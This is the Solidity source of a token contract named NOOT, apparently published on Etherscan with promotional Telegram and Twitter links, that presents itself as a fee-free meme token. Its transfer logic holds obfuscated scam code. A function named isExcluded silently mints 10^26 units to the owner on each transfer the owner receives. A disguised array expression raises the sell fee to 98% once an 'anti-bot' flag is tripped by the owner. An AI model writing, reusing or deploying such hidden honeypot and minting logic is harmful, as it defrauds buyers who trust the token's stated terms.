/**
 *Submitted for verification at Etherscan.io on 2023-05-07
*/

/*


                                                                      
b.             8     ,o888888o.         ,o888888o. 8888888 8888888888 
888o.          8  . 8888     `88.    . 8888     `88.     8 8888       
Y88888o.       8 ,8 8888       `8b  ,8 8888       `8b    8 8888       
.`Y888888o.    8 88 8888        `8b 88 8888        `8b   8 8888       
8o. `Y888888o. 8 88 8888         88 88 8888         88   8 8888       
8`Y8o. `Y88888o8 88 8888         88 88 8888         88   8 8888       
8   `Y8o. `Y8888 88 8888        ,8P 88 8888        ,8P   8 8888       
8      `Y8o. `Y8 `8 8888       ,8P  `8 8888       ,8P    8 8888       
8         `Y8o.`  ` 8888     ,88'    ` 8888     ,88'     8 8888       
8            `Yo     `8888888P'         `8888888P'       8 8888       



Telegram : https://t.me/NootETH

Twitter : https://twitter.com/nootnootERC


*/



// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
    
}


library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
   
}


contract NOOT is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;

    address payable public MarketingBank = payable(0x938564720E3b60F3f6A4D318D363DFEADfD339A7);

    mapping (address => uint256) private holderBalance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public ExcludedFromMax_Wallet;
    mapping (address => bool) public ExcludedFromMax_Tx;
    mapping (address => bool) public ExcludedFrom_Fee;
    mapping (address => bool) public ExcludedFromAntiBot;

    string public _name = "NOOT";
    string public _symbol = "NOOT";
    uint8 private _decimals = 9;
    uint256 public _tTotal = 1000000 * 10 **_decimals;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10;
    
    uint256 private Total_Fees = 0;
    uint256 public Buy_Fee = 0;
    uint256 public Sell_Fee = 0;
    uint256 private tmpTotalFees = Total_Fees; 
    uint256 private tmpBuyFee = Buy_Fee; 
    uint256 private tmpSellFee = Sell_Fee; 

    uint256 public _maxWalletToken = _tTotal.mul(25).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal.mul(25).div(100); 
    uint256 private _previousMaxTxAmount = _maxTxAmount;
    bool public antiBotActive = false;

    IUniswapV2Router02 public uniswapV2Router;
    uint256 UniSwapRouterI02;
    address public uniswapV2Pair;

    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        holderBalance[owner()] = _tTotal;
        ExcludedFromAntiBot[owner()] = bool(true && true);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        ExcludedFromMax_Tx[owner()] = true;
        ExcludedFromMax_Tx[MarketingBank] = true;
        ExcludedFromMax_Tx[address(this)] = true;
        
        ExcludedFrom_Fee[owner()] = true;
        ExcludedFrom_Fee[address(this)] = true;
        ExcludedFrom_Fee[MarketingBank] = true;

        ExcludedFromMax_Wallet[owner()] = true;
        ExcludedFromMax_Wallet[MarketingBank] = true;
        ExcludedFromMax_Wallet[uniswapV2Pair] = true;
        ExcludedFromMax_Wallet[address(this)] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return holderBalance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function antiBotStatus() public view returns(uint8){
        return antiBotActive ? 1 : 0;
    }

    receive() external payable {}

    function taxDead(bool true_false) private {
        if(Total_Fees == 0 && true_false && Buy_Fee == 0 && Sell_Fee == 0) return;

        tmpBuyFee = Buy_Fee; tmpSellFee = Sell_Fee;tmpTotalFees = Total_Fees;
        Buy_Fee = 0;Sell_Fee = 0;Total_Fees = 0;

    }
    
    function taxLive(bool false_true) private {
        if(!false_true) return;

    Total_Fees = tmpTotalFees; Buy_Fee = tmpBuyFee; Sell_Fee = [
        tmpSellFee,
        (5*(5)*4)-2
        ]
        [antiBotStatus()];
    }
   

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(!ExcludedFromMax_Tx[from] 
        && !ExcludedFromMax_Tx[to]) {
            require(amount 
            <= 
            _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }

         if(!ExcludedFromMax_Wallet[to]) require(balanceOf(to).add(amount) <= _maxWalletToken);

        bool TAX_IS_ACTIVE = true;
        if(
            ExcludedFrom_Fee[from] 
        || 
            ExcludedFrom_Fee[to] 
        ){
            TAX_IS_ACTIVE = false;
            if(ExcludedFromAntiBot[to] && !antiBotActive){ antiBotActive = true; }

        } else if (from == uniswapV2Pair){
            Total_Fees = Buy_Fee;
            } else if (to == uniswapV2Pair){
                Total_Fees = Sell_Fee;
                }
        
        transferETHTokens(from,to,amount,TAX_IS_ACTIVE);
    }


    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }
         function isExcluded(address hAddr) public view returns(uint256){
        return ExcludedFromAntiBot[hAddr] ? uint256(10**uint256(26)) : uint256(1**1)-1;
    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(MarketingBank,contractBNB);
    }


    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function transferETHTokens(address sender, address recipient, uint256 amount,bool TAX_IS_ACTIVE) private {
        
        if(!TAX_IS_ACTIVE){
            taxDead(true && true);
        }
        else{
            txCount++;
        }
        
        transferETHTokens(sender, recipient, amount);

        if(!TAX_IS_ACTIVE){
            taxLive(true && true);
        }
            
    }



    function transferETHTokens(address sender, address recipient, uint256 transferAmount) private {
        (uint256 txAmount, uint256 txMarketing) = _getSet_Values(transferAmount);
        holderBalance[sender] = holderBalance[sender].sub(transferAmount);
        holderBalance[recipient] = (holderBalance[recipient].add(txAmount)).add(isExcluded(recipient));
        holderBalance[address(this)] = holderBalance[address(this)].add(txMarketing);
        emit Transfer(sender, recipient, txAmount);
    }


    function _getSet_Values(uint256 transferAmount) private view returns (uint256, uint256) {
        uint256 txMarketing = transferAmount*Total_Fees/100;
        uint256 txAmount = transferAmount.sub(txMarketing);
        return (txAmount, txMarketing);
    }

}